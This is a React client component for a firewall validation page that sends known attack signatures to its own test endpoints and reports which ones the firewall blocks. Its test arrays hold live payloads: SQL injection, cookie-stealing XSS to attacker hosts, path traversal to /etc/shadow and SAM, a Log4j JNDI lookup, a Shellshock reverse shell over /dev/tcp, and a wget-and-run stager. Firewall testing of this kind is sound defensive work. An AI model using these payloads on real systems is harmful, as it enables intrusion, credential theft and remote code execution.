'use client';

import { useState, useEffect, useRef } from 'react';
import { ShieldAlertIcon, EyeOffIcon, ServerIcon, RadioIcon, TrashIcon, PlayIcon, GlobeIcon, BugIcon, TargetIcon } from '@/components/Icons';
import { generateNGFWReport, type NGFWTestResult } from '@/lib/reportGenerator';

type TestResult = 'idle' | 'running' | 'blocked' | 'allowed' | 'error';
// eslint-disable-next-line @typescript-eslint/no-unused-vars
interface LogLike { timestamp: string; type: string; message: string; }

const DELAY_OPTIONS = [1, 6, 15, 30];

export default function NGFWClient() {
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    const [results, setResults] = useState<{ [key: string]: TestResult }>({
        evasion: 'idle',
        ips: 'idle',
        c2c: 'idle',
    });
    const [logs, setLogs] = useState<{ timestamp: string; type: string; message: string; }[]>([]);
    const [interDelay, setInterDelay] = useState(6);
    const consoleEndRef = useRef<HTMLDivElement>(null);
    const [testHistory, setTestHistory] = useState<NGFWTestResult[]>([]);
    const [ipData, setIpData] = useState<{ ip: string; country: string } | null>(null);
    const testIdRef = useRef(0);

    useEffect(() => {
        fetch('/api/my-ip').then(r => r.json()).then(d => setIpData(d)).catch(() => {});
    }, []);

    const addNGFWResult = (category: string, testName: string, severity: string, result: 'blocked' | 'allowed' | 'error') => {
        testIdRef.current += 1;
        setTestHistory(prev => [...prev, {
            id: testIdRef.current,
            time: new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
            category, testName, severity, result,
        }]);
    };

    const handleGenerateReport = async () => {
        const pdfBytes = await generateNGFWReport(testHistory, ipData || undefined);
        const blob = new Blob([new Uint8Array(pdfBytes)], { type: 'application/pdf' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `NGFW-Security-Assessment-${new Date().toISOString().slice(0, 10)}.pdf`;
        a.click();
        URL.revokeObjectURL(url);
    };

    useEffect(() => {
        // Prevent the entire browser window from jumping down on load or log addition.
        // `block: 'nearest'` ensures only the scrollable <div> container itself scrolls internally.
        consoleEndRef.current?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }, [logs]);

    const addLog = (type: string, message: string) => {
        const now = new Date().toISOString().split('T')[1].slice(0, 8);
        setLogs(prev => [...prev.slice(-24), { timestamp: now, type, message }]);
    };

    // Countdown sleep — logs each remaining second to the console.
    // At 1s (default) just waits silently without spamming countdown lines.
    const countdownSleep = async (seconds: number, label: string) => {
        if (seconds <= 1) {
            await new Promise(r => setTimeout(r, 1000));
            return;
        }
        for (let i = seconds; i > 0; i--) {
            addLog('Wait', `[IP Shun Cooldown] Next attack (${label}) in ${i}s...`);
            await new Promise(r => setTimeout(r, 1000));
        }
    };

    const runSimulation = async (testName: string, url: string, description: string, headers: HeadersInit = {}, mode?: RequestMode) => {
        setResults(prev => ({ ...prev, [testName]: 'running' }));

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);

            // 1. Cache-Busting: Ensure the browser doesn't swallow sequential TCP drops locally
            const cacheBusterParams = url.includes('?') ? `&_cb=${Date.now()}` : `?_cb=${Date.now()}`;
            const uncacheableUrl = `${url}${cacheBusterParams}`;

            const fetchOpts: RequestInit = { 
                headers: {
                    ...headers,
                    'Connection': 'close', // 1b. Force TCP connection closure so browser doesn't reuse blackholed sockets
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache'
                }, 
                cache: 'no-store', // 2. Hard disable browser caching headers
                signal: controller.signal 
            };
            if (mode) fetchOpts.mode = mode;

            const res = await fetch(uncacheableUrl, fetchOpts);
            clearTimeout(timeoutId);

            if (res.status === 403 || res.status === 503 || res.status === 502) {
                setResults(prev => ({ ...prev, [testName]: 'blocked' }));
                addLog('Result', `Success - Blocked by firewall (HTTP ${res.status}): ${description}`);
                return 'blocked';
            } else if (res.ok || res.type === 'opaque' || res.status === 404 || res.status === 405) {
                setResults(prev => ({ ...prev, [testName]: 'allowed' }));
                addLog('Result', `Vulnerable - Payload reached destination (HTTP ${res.status || 'Opaque'}): ${description}`);
                return 'allowed';
            } else {
                setResults(prev => ({ ...prev, [testName]: 'error' }));
                addLog('Result', `Error - Unexpected status ${res.status}: ${description}`);
                return 'error';
            }
        } catch (e) {
            setResults(prev => ({ ...prev, [testName]: 'blocked' }));
            addLog('Result', `Success - Connection dropped/timeout: ${description}`);
            return 'blocked';
        }
    };

    const logSummary = (blocked: number, total: number) => {
        addLog('INFO', `SUMMARY: ${blocked}/${total} attacks blocked successfully.`);
    };

    const handleIPS = async () => {
        const tests = [
            { url: '/api/ngfw/test?id=1%27%20UNION%20SELECT%20user,password%20FROM%20information_schema.tables--', desc: 'SQL Injection', scenario: 'Data Exfiltration vector (UNION SELECT) injected into HTTP query strings. Tests IPS detection for active database schema dumping.' },
            { url: '/api/ngfw/test?q=<script>document.location=\'http://attacker.com/stealer.cgi?c=\'+document.cookie</script>', desc: 'Cross-Site Scripting (XSS)', scenario: 'Malicious Document Object Model (DOM) injection. Tests if the IPS detects and drops active Cookie-Stealing JavaScript execution.' },
            { url: '/api/ngfw/test?file=../../../../../../../../../../etc/shadow', desc: 'Directory Traversal', scenario: 'Deep path traversal attempt sent via HTTP aiming for the /etc/shadow file. Tests if IPS prevents unauthorized root system access.' }
        ];

        let blockedCount = 0;
        for (let i = 0; i < tests.length; i++) {
            const test = tests[i];
            addLog('Test', test.scenario);
            const result = await runSimulation('ips', test.url, test.desc);
            if (result === 'blocked') blockedCount++;
            addNGFWResult('IPS', test.desc, 'High', result as 'blocked' | 'allowed' | 'error');
            if (i < tests.length - 1) await countdownSleep(interDelay, tests[i + 1].desc);
        }
        logSummary(blockedCount, tests.length);
        return blockedCount;
    };

    const handleEvasion = async () => {
        const tests = [
            // Log4j (Header Injection) - Highly Detectable LDAP Stager
            {
                url: '/api/ngfw/test',
                headers: { 'X-Api-Version': '${jndi:ldap://malicious-c2.com:1389/Exploit.class}' },
                desc: 'Log4j JNDI Injection (Header)',
                scenario: 'Injecting an active Log4j signature (JNDI/LDAP on explicitly known malicious stager port 1389) into headers. Tests Deep Packet Inspection of Java Object injection.'
            },
            // Obfuscated SQL Injection (AET - Hex/URL Encoding)
            {
                url: '/api/ngfw/test?id=%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%20%2d%2d',
                headers: {},
                desc: 'Hex/URL Encoded SQLi',
                scenario: 'Sending a heavily Hex/URL encoded SQL Injection vector (%31%20%75...). Tests if the IPS normalizes and decodes complex character representations before signature matching.'
            },
            // Shellshock (Header Injection) - Active Reverse Shell
            {
                url: '/api/ngfw/test',
                headers: { 'X-Custom-UA': '() { :;}; /bin/bash -i >& /dev/tcp/malicious.example.com/443 0>&1' },
                desc: 'Shellshock RCE (Header)',
                scenario: 'Injecting an active Shellshock reverse-shell spawn attempt into custom headers. Tests signatures against Bash environment variable execution vectors.'
            }
        ];

        let blockedCount = 0;
        for (let i = 0; i < tests.length; i++) {
            const test = tests[i];
            addLog('Test', test.scenario);
            const result = await runSimulation('evasion', test.url, test.desc, test.headers as HeadersInit);
            if (result === 'blocked') blockedCount++;
            addNGFWResult('AET', test.desc, test.desc.includes('Log4j') || test.desc.includes('Shellshock') ? 'Critical' : 'Medium', result as 'blocked' | 'allowed' | 'error');
            if (i < tests.length - 1) await countdownSleep(interDelay, tests[i + 1].desc);
        }
        logSummary(blockedCount, tests.length);
        return blockedCount;
    };

    const handleC2C = async () => {
        const tests: { url: string; headers: HeadersInit; desc: string; scenario: string; mode?: RequestMode }[] = [
            // Encoded Path Traversal Exfiltration — uses URL-encoded ..%2f sequences
            // Target: HTTP_CSU-Apache-Struts-Encoded-Dot-Dot-Slash-Directory-Traversal (Disclosure - 1st Class)
            {
                url: '/api/ngfw/test?c2=..%2f..%2f..%2f..%2fetc%2fpasswd&exfil=active',
                headers: {},
                desc: 'Encoded Path Traversal Exfil',
                scenario: 'C2 exfiltration channel using encoded directory traversal sequences (..%2f) to access sensitive system files. Tests IPS detection for Apache Struts-style encoded path manipulation.'
            },
            // Web Shell Simulation (Simulating outbound command beacon)
            {
                url: '/api/ngfw/test?cmd=;wget http://malicious.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh',
                headers: {},
                desc: 'External Web Shell Beacon',
                scenario: 'Sending standard Linux enumeration and stager download commands via a mocked webshell proxy parameter. Tests Application Control for interactive shell traffic.'
            },
            // ActiveX Dropper Delivery — response contains Scripting.FileSystemObject patterns
            // Target: HTTP_Scripting.FileSystemObject-ActiveX-Object-Local-File-Write (Compromise - 1st Class)
            {
                url: '/api/ngfw/c2-stager?type=activex',
                headers: {},
                desc: 'ActiveX Dropper Delivery',
                scenario: 'C2 server delivering an ActiveX dropper payload using Scripting.FileSystemObject to write malicious files to disk. Tests IPS content inspection for ActiveX-based file write attacks.'
            }
        ];

        let blockedCount = 0;
        for (let i = 0; i < tests.length; i++) {
            const test = tests[i];
            addLog('Test', test.scenario);
            const result = await runSimulation('c2c', test.url, test.desc, test.headers, test.mode);
            if (result === 'blocked') blockedCount++;
            addNGFWResult('C2C', test.desc, 'Critical', result as 'blocked' | 'allowed' | 'error');
            if (i < tests.length - 1) await countdownSleep(interDelay, tests[i + 1].desc);
        }
        logSummary(blockedCount, tests.length);
        return blockedCount;
    };

    const handleRunAll = async () => {
        addLog('INFO', '═══ Running All Tests (IPS → AET → C2C) ═══');
        const ipsBlocked = await handleIPS();
        await countdownSleep(interDelay, 'AET Test Suite');
        const aetBlocked = await handleEvasion();
        await countdownSleep(interDelay, 'C2C Test Suite');
        const c2cBlocked = await handleC2C();
        const totalBlocked = ipsBlocked + aetBlocked + c2cBlocked;
        addLog('INFO', '═══ All Tests Complete ═══');
        addLog('INFO', `TOTAL: ${totalBlocked}/9 attacks blocked successfully.`);
    };

    const handleFloodTest = async () => {
        addLog('INFO', '🚀 Starting Network IP Flood Test — 30 continuous attacks...');

        // 13 NGFW-verified URL-based attack patterns (proven blocked by Forcepoint IPS)
        // Uses the IP Shun Cooldown Delay between requests so each attack gets
        // individually inspected and logged by the NGFW (no silent shun drops).
        const attackPatterns = [
            { payload: "id=1' UNION SELECT username,password FROM users--", name: 'SQL Injection (UNION SELECT)' },
            { payload: "id=1' UNION SELECT username,password FROM admin_users WHERE '1'='1'--", name: 'SQL Injection (Admin Dump)' },
            { payload: "id=1' UNION ALL SELECT NULL,table_name FROM information_schema.tables--", name: 'SQL Injection (Schema Enum)' },
            { payload: "id=1' UNION SELECT password FROM mysql.user--", name: 'SQL Injection (MySQL Creds)' },
            { payload: "q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>&file=..%2f..%2f..%2fetc%2fpasswd", name: 'XSS + Path Traversal' },
            { payload: "path=..%2f..%2f..%2f..%2fetc%2fpasswd", name: 'Encoded Path Traversal (%2f)' },
            { payload: "path=....//....//....//etc/passwd", name: 'Path Traversal (double dot)' },
            { payload: "path=..%252f..%252f..%252fetc/passwd", name: 'Double-Encoded Traversal' },
            { payload: "path=..%c0%af..%c0%afetc/passwd", name: 'UTF-8 Overlong Traversal' },
            { payload: "path=..\\..\\..\\windows\\system32\\config\\sam", name: 'Windows Path Traversal' },
            { payload: "file=....//....//....//etc/shadow", name: 'System File (/etc/shadow)' },
            { payload: "path=..%2f..%2f..%2f..%2fvar%2flog%2fauth.log", name: 'Path Traversal (auth.log)' },
            { payload: "file=..%2f..%2f..%2fproc%2fself%2fenviron", name: 'System File (/proc/environ)' },
        ];

        // Fisher-Yates shuffle for random signature order each run
        const shuffled = [...attackPatterns];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let blockedCount = 0;
        const totalPackets = 30;

        for (let i = 0; i < totalPackets; i++) {
            const attack = shuffled[i % shuffled.length];
            const url = `/api/ngfw/flood/${i}?${attack.payload}&_cb=${Date.now()}`;

            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 5000);

                const res = await fetch(url, {
                    method: 'GET',
                    cache: 'no-store',
                    signal: controller.signal,
                });
                clearTimeout(timeout);

                if (res.status === 403 || res.status === 503) {
                    blockedCount++;
                    addLog('Result', `Success - Blocked (HTTP ${res.status}): ${attack.name} [${i + 1}/${totalPackets}]`);
                    addNGFWResult('Flood', attack.name, 'High', 'blocked');
                } else {
                    try {
                        await res.arrayBuffer();
                        addLog('Result', `Vulnerable - Payload reached destination (HTTP ${res.status}): ${attack.name} [${i + 1}/${totalPackets}]`);
                        addNGFWResult('Flood', attack.name, 'High', 'allowed');
                    } catch {
                        blockedCount++;
                        addLog('Result', `Success - Body terminated by firewall: ${attack.name} [${i + 1}/${totalPackets}]`);
                        addNGFWResult('Flood', attack.name, 'High', 'blocked');
                    }
                }
            } catch {
                blockedCount++;
                addLog('Result', `Success - Connection dropped/timeout: ${attack.name} [${i + 1}/${totalPackets}]`);
                addNGFWResult('Flood', attack.name, 'High', 'blocked');
            }

        }

        addLog('INFO', `SUMMARY: ${blockedCount}/${totalPackets} packets blocked by firewall.`);
        addLog('INFO', '✅ Flood complete! Check your firewall console for mass detections.');
    };

    return (
        <div>
            <header style={{ marginBottom: '2rem', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                <div>
                    <h1 style={{ fontSize: '1.8rem', color: '#0F172A', marginBottom: '0.2rem' }}>NGFW Validation</h1>
                    <p style={{ margin: 0, fontSize: '0.95rem', color: '#64748B' }}>
                        Execute active traffic simulations to test Firewall policies and IPS engines.
                    </p>
                    <div style={{ marginTop: '1rem', padding: '0.75rem', background: '#FFF7ED', borderLeft: '4px solid #F97316', borderRadius: '4px', fontSize: '0.85rem', color: '#9A3412' }}>
                        <strong>⚠️ Important:</strong> These tests run over HTTPS (Port 443). Your firewall <u>must</u> have <strong>SSL Decryption (DPI-SSL)</strong> enabled for this domain to inspect the payloads. Without decryption, the firewall cannot see the attack signatures inside the encrypted tunnel.
                    </div>
                </div>

            </header>

            <div className="layout-ngfw">

                {/* Test Modules List */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>

                    {/* Inter-Test Delay Selector — sits above the test cards, inside the right column */}
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', flexWrap: 'wrap', padding: '0.6rem 0.25rem' }}>
                        <span style={{ fontSize: '0.85rem', color: '#475569', fontWeight: 600 }}>IP Shun Cooldown Delay:</span>
                        <div style={{ display: 'flex', gap: '0.5rem' }}>
                            {DELAY_OPTIONS.map(d => (
                                <button
                                    key={d}
                                    onClick={() => setInterDelay(d)}
                                    style={{
                                        padding: '0.3rem 0.75rem',
                                        borderRadius: '6px',
                                        border: interDelay === d ? '2px solid #3B82F6' : '2px solid #CBD5E1',
                                        background: interDelay === d ? '#EFF6FF' : 'white',
                                        color: interDelay === d ? '#1D4ED8' : '#475569',
                                        fontWeight: interDelay === d ? 700 : 400,
                                        cursor: 'pointer',
                                        fontSize: '0.82rem',
                                        transition: 'all 0.15s'
                                    }}
                                >{d === 1 ? '~1s' : `${d}s`}</button>
                            ))}
                        </div>
                        <span style={{ fontSize: '0.78rem', color: '#94A3B8', fontStyle: 'italic' }}>Pause between attacks — increase if NGFW only logs the first attack</span>
                    </div>

                    {/* Run All Tests */}
                    <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '0.25rem 0' }}>
                        <span style={{ fontSize: '0.82rem', color: '#64748B' }}>Run IPS, AET, and C2C tests sequentially</span>
                        <button className="btn-outline" style={{ whiteSpace: 'nowrap' }} onClick={handleRunAll}>
                            <TargetIcon width={16} height={16} /> Run All Tests
                        </button>
                    </div>

                    {/* IPS Test Card */}
                    <div className="card" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '1.5rem' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                            <div style={{ background: '#1E293B', color: 'white', padding: '0.8rem', borderRadius: '8px', display: 'flex' }}>
                                <ShieldAlertIcon width={24} height={24} />
                            </div>
                            <div>
                                <h3 style={{ margin: 0, fontSize: '1rem' }}>Intrusion Prevention (IPS) Signature</h3>
                                <div style={{ fontSize: '0.8rem', color: '#64748B' }}>SQLi, XSS, Path Traversal</div>
                            </div>
                        </div>
                        <button
                            className="btn-outline"
                            onClick={handleIPS}
                        >
                            <PlayIcon width={16} height={16} /> Execute
                        </button>
                    </div>

                    {/* Evasion Test Card */}
                    <div className="card" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '1.5rem' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                            <div style={{ background: '#1E293B', color: 'white', padding: '0.8rem', borderRadius: '8px', display: 'flex' }}>
                                <EyeOffIcon width={24} height={24} />
                            </div>
                            <div>
                                <h3 style={{ margin: 0, fontSize: '1rem' }}>Advanced Evasion Technique (AET)</h3>
                                <div style={{ fontSize: '0.8rem', color: '#64748B' }}>Obfuscation, URL/Hex Encoding</div>
                            </div>
                        </div>
                        <button
                            className="btn-outline"
                            onClick={handleEvasion}
                        >
                            <PlayIcon width={16} height={16} /> Execute
                        </button>
                    </div>

                    {/* C2C Test Card */}
                    <div className="card" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '1.5rem' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                            <div style={{ background: '#1E293B', color: 'white', padding: '0.8rem', borderRadius: '8px', display: 'flex' }}>
                                <RadioIcon width={24} height={24} />
                            </div>
                            <div>
                                <h3 style={{ margin: 0, fontSize: '1rem' }}>Command & Control (C2C) Beacon</h3>
                                <div style={{ fontSize: '0.8rem', color: '#64748B' }}>OOB Exfil, Web Shells, Stagers</div>
                            </div>
                        </div>
                        <button
                            className="btn-outline"
                            onClick={handleC2C}
                        >
                            <PlayIcon width={16} height={16} /> Execute
                        </button>
                    </div>

                    {/* Separator + Flood Stress Test */}
                    <div style={{ marginTop: '1rem', padding: '0.75rem 0', borderTop: '1px solid #E2E8F0' }}>
                        <p style={{ margin: '0 0 0.5rem 0', fontSize: '0.85rem', color: '#64748B' }}>
                            <strong style={{ color: '#475569' }}>Standalone Test</strong> — This test is independent and not included in "Run All Tests". It fires 30 randomized attacks to stress-test your firewall's sustained blocking capability.
                        </p>
                    </div>
                    <div className="card" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '1.5rem' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                            <div style={{ background: '#1E293B', color: 'white', padding: '0.8rem', borderRadius: '8px', display: 'flex' }}>
                                <GlobeIcon width={24} height={24} />
                            </div>
                            <div>
                                <h3 style={{ margin: 0, fontSize: '1rem' }}>Network IP Flooder</h3>
                                <div style={{ fontSize: '0.8rem', color: '#64748B' }}>30 randomized attack signatures with IP Shun Cooldown. Warning: May trigger aggressive IP Shunning.</div>
                            </div>
                        </div>
                        <button
                            className="btn-outline"
                            onClick={handleFloodTest}
                        >
                            <PlayIcon width={16} height={16} /> Flood
                        </button>
                    </div>

                </div>

                {/* Console Output */}
                <div className="console-sticky" style={{
                    background: '#0F172A',
                    borderRadius: '12px',
                    padding: '1.5rem',
                    color: '#38BDF8',
                    fontFamily: 'monospace',
                    fontSize: '0.85rem',
                    height: '500px',
                    display: 'flex',
                    flexDirection: 'column'
                }}>
                    <div style={{ borderBottom: '1px solid #334155', paddingBottom: '0.5rem', marginBottom: '1rem', color: '#F8FAFC', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <span style={{ fontWeight: 600 }}>&gt;_ Console Output</span>
                        <button
                            onClick={() => setLogs([])}
                            onMouseEnter={(e) => (e.currentTarget.style.color = '#FFFFFF')}
                            onMouseLeave={(e) => (e.currentTarget.style.color = '#E2E8F0')}
                            style={{
                                background: 'transparent',
                                border: 'none',
                                color: '#E2E8F0',
                                cursor: 'pointer',
                                padding: '4px',
                                display: 'flex',
                                alignItems: 'center',
                                gap: '4px',
                                fontSize: '0.8rem',
                                transition: 'color 0.2s',
                                fontWeight: 500
                            }}
                            title="Clear Console"
                        >
                            <TrashIcon width={16} height={16} /> <span style={{ textDecoration: 'underline', textUnderlineOffset: '2px' }}>Clear</span>
                        </button>
                    </div>

                    <div style={{ flex: 1, overflowY: 'auto' }}>
                        {logs.length === 0 ? (
                            <span style={{ opacity: 0.5, fontStyle: 'italic' }}>Waiting for test execution...</span>
                        ) : (
                            logs.map((log, i) => (
                                <div key={i} style={{
                                    marginBottom: '0.4rem',
                                    opacity: log.type === 'Wait' ? 0.45 : 1,
                                    fontStyle: log.type === 'Wait' ? 'italic' : 'normal'
                                }}>
                                    <span style={{ color: '#64748B', marginRight: '0.5rem' }}>[{log.timestamp}]</span>
                                    {log.type !== 'Wait' && (
                                        <span style={{
                                            color: log.type === 'Result' && log.message.includes('Success') ? '#4ADE80' :
                                                log.type === 'Result' && log.message.includes('Error') ? '#F87171' :
                                                log.type === 'Result' && log.message.includes('Vulnerable') ? '#FCD34D' : '#38BDF8',
                                            fontWeight: 'bold',
                                            marginRight: '0.5rem'
                                        }}>{log.type}:</span>
                                    )}
                                    <span style={{ color: log.type === 'Wait' ? '#475569' : '#E2E8F0', fontWeight: log.type === 'INFO' ? 'bold' : 'normal' }}>
                                        {log.message}
                                    </span>
                                </div>
                            ))
                        )}
                        <div style={{ marginTop: '0.5rem', borderLeft: '2px solid #38BDF8', height: '1rem', animation: 'blink 1s infinite' }}></div>
                        <div ref={consoleEndRef} />
                    </div>
                </div>
            </div>

            {/* Floating Report Bar */}
            {testHistory.length > 0 && (
                <div style={{
                    position: 'fixed', bottom: 0, left: 72, right: 0,
                    background: 'rgba(15, 23, 42, 0.95)', backdropFilter: 'blur(8px)',
                    padding: '0.75rem 2rem', display: 'flex', alignItems: 'center', gap: '1rem',
                    zIndex: 100, borderTop: '1px solid rgba(255,255,255,0.1)',
                }}>
                    <span style={{ color: '#94A3B8', fontSize: '0.9rem', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                        {testHistory.length} test{testHistory.length > 1 ? 's' : ''} completed
                    </span>
                    <span style={{ color: '#10B981', fontSize: '0.85rem' }}>
                        {testHistory.filter(t => t.result === 'blocked').length} blocked
                    </span>
                    <span style={{ color: '#EF4444', fontSize: '0.85rem' }}>
                        {testHistory.filter(t => t.result === 'allowed').length} passed
                    </span>
                    <div style={{ marginLeft: 'auto', display: 'flex', gap: '0.75rem' }}>
                        <button
                            onClick={() => { setTestHistory([]); testIdRef.current = 0; }}
                            style={{
                                background: 'transparent', border: '1px solid #475569', color: '#94A3B8',
                                padding: '0.5rem 1rem', borderRadius: '6px', cursor: 'pointer', fontSize: '0.85rem',
                            }}
                        >
                            Clear Results
                        </button>
                        <button
                            onClick={handleGenerateReport}
                            style={{
                                background: '#2563EB', border: 'none', color: 'white',
                                padding: '0.5rem 1.25rem', borderRadius: '6px', cursor: 'pointer',
                                fontSize: '0.85rem', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '0.5rem',
                            }}
                        >
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                            Generate Report
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}
